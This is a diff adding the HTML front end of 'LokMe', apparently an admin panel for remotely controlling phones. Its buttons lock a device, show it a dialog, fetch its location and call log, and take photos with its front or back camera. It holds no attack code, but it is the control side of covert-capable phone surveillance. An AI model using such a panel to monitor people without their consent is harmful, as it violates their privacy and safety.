@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>LokMe - Admin Dashboard</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="app">
+    <!-- Sidebar -->
+    <aside class="sidebar">
+      <div class="logo">
+        <h2>LokMe</h2>
+        <span>Admin Panel</span>
+      </div>
+      <nav>
+        <button class="nav-btn active" data-section="devices">Devices</button>
+        <button class="nav-btn" data-section="commands">Commands</button>
+        <button class="nav-btn" data-section="calllogs">Call Logs</button>
+        <button class="nav-btn" data-section="photos">Photos</button>
+      </nav>
+      <div class="server-status">
+        <span id="wsStatus" class="status-dot disconnected"></span>
+        <span id="wsLabel">Disconnected</span>
+      </div>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="content">
+      <!-- Devices Section -->
+      <section id="sec-devices" class="section active">
+        <div class="section-header">
+          <h1>Devices</h1>
+          <button class="btn btn-primary" onclick="refreshDevices()">Refresh</button>
+        </div>
+        <div id="deviceList" class="card-grid"></div>
+
+        <!-- Device Detail Panel -->
+        <div id="deviceDetail" class="hidden">
+          <div class="section-header">
+            <h2 id="detailTitle">Device</h2>
+            <button class="btn btn-secondary" onclick="showDeviceList()">Back</button>
+          </div>
+
+          <!-- Command Buttons -->
+          <div class="command-bar">
+            <button class="btn btn-danger" onclick="sendCommand('LOCK_DEVICE')">Lock Device</button>
+            <button class="btn btn-primary" onclick="promptDialog()">Send Dialog</button>
+            <button class="btn btn-primary" onclick="sendCommand('GET_LOCATION')">Get Location</button>
+            <button class="btn btn-primary" onclick="sendCommand('GET_CALL_LOG')">Get Call Log</button>
+            <button class="btn btn-primary" onclick="capturePhoto(false)">Capture Back</button>
+            <button class="btn btn-primary" onclick="capturePhoto(true)">Capture Front</button>
+          </div>
+
+          <!-- Map -->
+          <div id="map" class="map-container"></div>
+          <div id="locationInfo" class="info-bar hidden"></div>
+
+          <!-- Command History -->
+          <h3>Command History</h3>
+          <div id="commandHistory" class="table-container"></div>
+        </div>
+      </section>
+
+      <!-- Commands Section -->
+      <section id="sec-commands" class="section">
+        <div class="section-header">
+          <h1>All Commands</h1>
+          <button class="btn btn-primary" onclick="refreshAllCommands()">Refresh</button>
+        </div>
+        <div id="allCommands" class="table-container"></div>
+      </section>
+
+      <!-- Call Logs Section -->
+      <section id="sec-calllogs" class="section">
+        <div class="section-header">
+          <h1>Call Logs</h1>
+          <button class="btn btn-primary" onclick="refreshCallLogs()">Refresh</button>
+        </div>
+        <div id="callLogsList" class="table-container"></div>
+      </section>
+
+      <!-- Photos Section -->
+      <section id="sec-photos" class="section">
+        <div class="section-header">
+          <h1>Photos</h1>
+          <button class="btn btn-primary" onclick="refreshPhotos()">Refresh</button>
+        </div>
+        <div id="photoGrid" class="photo-grid"></div>
+      </section>
+
+      <!-- Dialog Modal -->
+      <div id="dialogModal" class="modal hidden">
+        <div class="modal-content">
+          <h3>Send Dialog to Device</h3>
+          <input type="text" id="dialogTitle" placeholder="Title" value="Alert" />
+          <textarea id="dialogMessage" placeholder="Message..." rows="3"></textarea>
+          <div class="modal-actions">
+            <button class="btn btn-secondary" onclick="closeModal()">Cancel</button>
+            <button class="btn btn-primary" onclick="sendDialog()">Send</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Response Toast -->
+      <div id="toast" class="toast hidden"></div>
+    </main>
+  </div>
+
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script src="app.js"></script>
+</body>
+</html>
